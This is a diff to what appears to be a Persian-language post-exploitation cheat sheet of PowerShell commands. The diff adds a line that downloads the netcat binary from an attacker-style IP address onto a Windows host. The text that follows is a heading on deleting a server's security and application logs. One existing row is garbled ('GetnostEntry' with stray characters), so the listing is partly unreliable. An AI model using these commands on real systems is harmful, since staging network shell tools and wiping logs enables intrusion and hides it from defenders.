@@ -721,6 +721,7 @@ Step by step instructions on room362.com for step below
 | get-help ' -parameter credential | دریافت اطلاعات هویتی |
 | get-wmiobject -list -'network' | WMI موجود در شبکه |
 | \(Net.DNS\]: :GetnostEntry\(" ip "I | فرآیند DNS Lookup |
+| powershell.exe wget "http://10.10.10.10/nc.exe" -outfile "c:\temp\nc.exe" | دریافت و ذخیره سازی فایل |
 
 ### حذف گزارشات امنیت و برنامه ها\(برای SVR01\)
 
